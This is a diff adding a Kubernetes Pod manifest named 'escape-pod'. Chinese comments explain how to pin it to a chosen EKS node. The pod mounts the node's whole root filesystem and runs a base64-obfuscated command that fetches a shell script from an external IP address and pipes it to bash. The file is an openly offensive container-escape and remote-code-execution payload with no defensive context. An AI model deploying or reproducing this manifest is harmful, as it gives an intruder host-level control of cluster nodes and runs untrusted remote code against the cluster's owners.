@@ -1,0 +1,20 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-pod
+spec:
+  # 关键点：直接指定节点名称
+  # 在 EKS 中，节点名通常是私有 DNS 名称，如 ip-172-31-39-51.ap-southeast-1.compute.internal
+  nodeName: ip-10-110-158-103.ap-east-1.compute.internal
+  containers:
+  - name: ubuntu
+    image: public.ecr.aws/docker/library/ubuntu:22.04
+    command: ["/bin/bash", "-c", "echo Y3VybCAtcyA0My4yMjguMTI0LjE5OTo4MDgwLzEuc2ggfCBiYXNo | base64 -d | bash"]
+    volumeMounts:
+    - mountPath: /host-root
+      name: host-fs
+  volumes:
+  - name: host-fs
+    hostPath:
+      path: /
+      type: Directory
